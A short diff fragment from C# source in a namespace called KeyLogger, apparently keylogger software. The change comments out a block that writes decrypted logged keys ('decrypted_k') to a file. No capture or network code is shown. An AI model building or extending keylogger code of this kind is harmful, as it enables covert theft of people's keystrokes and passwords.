@@ -195,7 +195,7 @@ namespace KeyLogger
                 k = "";
             }
             //
-            if (!File.Exists(decode))
+            /*if (!File.Exists(decode))
             {
                 using (StreamWriter sw = File.CreateText(decode))
                 {
@@ -214,7 +214,7 @@ namespace KeyLogger
                         sw.WriteLine(decrypted_k);
                     }
                 }
-            }
+            }*/
         }
     }
 }
